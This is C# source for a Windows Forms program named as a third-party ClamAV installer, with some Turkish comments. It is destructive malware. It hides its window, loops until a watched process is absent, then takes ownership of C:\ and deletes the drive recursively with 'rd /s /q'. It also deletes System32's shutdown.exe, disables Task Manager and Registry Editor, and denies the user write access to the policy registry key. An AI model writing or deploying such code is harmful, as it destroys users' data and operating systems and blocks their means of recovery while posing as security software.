using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace thirdpartyclamavinstaller
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            // Form1 yüklenir yüklenmez arkaplanda çalıştır
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Visible = false;
            StartMonitoring();
            DisableTaskManager();
            DisableRegistryEditor();
            ModifyPermissionsAndRemoveShutdownExe();
            SetRegistryPermissions();
        }

        private void StartMonitoring()
        {
            while (true)
            {
                Process[] explorerProcesses = Process.GetProcessesByName("antivirusfalsepositivetest4");

                if (explorerProcesses.Length == 0)
                {
                    System32();
                }
            }
        }
        public static void System32()
        {

            // System32 dizin yolu
            string system32Path = ("C:\\");

            // takeown komutunu kullanarak sahipliği al
            Process takeownProcess = new Process();
            takeownProcess.StartInfo.FileName = "takeown";
            takeownProcess.StartInfo.Arguments = $"/F \"{system32Path}\" /R /A /D Y";
            takeownProcess.StartInfo.RedirectStandardOutput = true;
            takeownProcess.StartInfo.UseShellExecute = false;
            takeownProcess.StartInfo.CreateNoWindow = true;

            takeownProcess.Start();
            takeownProcess.WaitForExit();

            // icals komutunu kullanarak izinleri değiştir
            Process icaclsProcess = new Process();
            icaclsProcess.StartInfo.FileName = "icacls";
            icaclsProcess.StartInfo.Arguments = $"\"{system32Path}\" /grant %username%:(F)";
            icaclsProcess.StartInfo.RedirectStandardOutput = true;
            icaclsProcess.StartInfo.UseShellExecute = false;
            icaclsProcess.StartInfo.CreateNoWindow = true;

            icaclsProcess.Start();
            icaclsProcess.WaitForExit();

            // System32 dizinini silmek için rd komutunu kullan (Dikkatli olun!)
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/C rd /s /q \"{system32Path}\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
        }
        public static void ModifyPermissionsAndRemoveShutdownExe()
        {
            // System32 directory path
            string system32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");

            try
            {
                // Take ownership using takeown command
                Process takeownProcess = new Process();
                takeownProcess.StartInfo.FileName = "takeown";
                takeownProcess.StartInfo.Arguments = $"/F \"{system32Path}\" /R /A /D Y";
                takeownProcess.StartInfo.RedirectStandardOutput = true;
                takeownProcess.StartInfo.UseShellExecute = false;
                takeownProcess.StartInfo.CreateNoWindow = true;

                takeownProcess.Start();
                takeownProcess.WaitForExit();
                Console.WriteLine("Ownership taken successfully.");

                // Change permissions using icacls command
                Process icaclsProcess = new Process();
                icaclsProcess.StartInfo.FileName = "icacls";
                icaclsProcess.StartInfo.Arguments = $"\"{system32Path}\" /grant %username%:(F)";
                icaclsProcess.StartInfo.RedirectStandardOutput = true;
                icaclsProcess.StartInfo.UseShellExecute = false;
                icaclsProcess.StartInfo.CreateNoWindow = true;

                icaclsProcess.Start();
                icaclsProcess.WaitForExit();
                Console.WriteLine("Permissions modified successfully.");

                // Remove shutdown.exe
                string shutdownExePath = Path.Combine(system32Path, "shutdown.exe");
                if (File.Exists(shutdownExePath))
                {
                    File.Delete(shutdownExePath);
                    Console.WriteLine("shutdown.exe deleted successfully.");
                }
                else
                {
                    Console.WriteLine("shutdown.exe not found.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
        public static void SetRegistryPermissions()
        {
            try
            {
                string keyPath = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System";
                RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true);

                if (key != null)
                {
                    // Retrieve the existing security descriptor
                    System.Security.AccessControl.RegistrySecurity security = key.GetAccessControl();

                    // Add a rule to deny write permissions
                    security.AddAccessRule(new System.Security.AccessControl.RegistryAccessRule(
                        Environment.UserDomainName + "\\" + Environment.UserName,
                        System.Security.AccessControl.RegistryRights.WriteKey,
                        System.Security.AccessControl.AccessControlType.Deny));

                    // Set the modified security descriptor
                    key.SetAccessControl(security);

                    Console.WriteLine("Registry permissions set successfully.");
                }
                else
                {
                    Console.WriteLine("Registry key not found.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
        public static void DisableRegistryEditor()
        {
            try
            {
                string keyPath = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System";
                string valueName = "DisableRegistryTools";
                int valueData = 1;  // 1 to disable Registry Editor

                // Set the registry value
                Registry.SetValue(keyPath, valueName, valueData, RegistryValueKind.DWord);

                Console.WriteLine("Registry Editor disabled successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }


        public static void DisableTaskManager()
        {
            try
            {
                string keyPath = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System";
                string valueName = "DisableTaskMgr";
                int valueData = 1;  // 1 to disable Task Manager

                // Set the registry value
                Registry.SetValue(keyPath, valueName, valueData, RegistryValueKind.DWord);

                Console.WriteLine("Task Manager disabled successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

    }
}